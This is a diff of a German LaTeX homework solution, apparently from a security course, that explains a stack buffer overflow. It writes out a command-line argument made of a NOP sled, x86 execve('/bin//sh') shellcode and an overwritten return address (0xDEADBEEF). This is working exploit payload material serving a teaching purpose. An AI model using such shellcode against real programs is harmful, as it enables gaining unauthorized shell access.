@@ -51,8 +51,8 @@ Die Angabe ist hier in Little-Endian. Der erste Teil ist der Shellcode (von $\ba
 \subsection*{b)}
 Der Kommandozeilenparamter könnte wie folgt aussehen:\newline
 \begin{lstlisting}[caption={Kommandozeilenparamter ($\hat{=}$ einer Zeile)},captionpos=b]
-$\backslash$x90$\backslash$x90$\backslash$x90$\backslash$x90$\backslash$x90$\backslash$x90$\backslash$x90$\backslash$x31$\backslash$xc9$\backslash$xf7$\backslash$xe1$\backslash$x51$\backslash$x68$\backslash$x2f$\backslash$x2f$\backslash$x73
-$\backslash$x68$\backslash$x68 $\backslash$x2f$\backslash$x62$\backslash$x69$\backslash$x6e$\backslash$x89$\backslash$xe3$\backslash$xb0$\backslash$x0b$\backslash$xcd$\backslash$x80$\backslash$x90$\backslash$x90$\backslash$x90$\backslash$x90
+\x90\x90\x90\x90\x90\x90\x90\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73
+\x68\x68 \x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80\x90\x90\x90\x90
 \xEF\xBE\xAD\xDE
 \end{lstlisting}
 Die Instruktionen ''$\backslash$x90'' dienen hierbei als NOP-slide und als zusätzliches Padding um den Buffer zu überschreiben. Am ende muss die Adresse \texttt{0xDEADBEEF} in Little-Endian stehen. Damit wird die return-Adresse überschrieben und der Shellcode wird dadurch aufgerufen.\newline
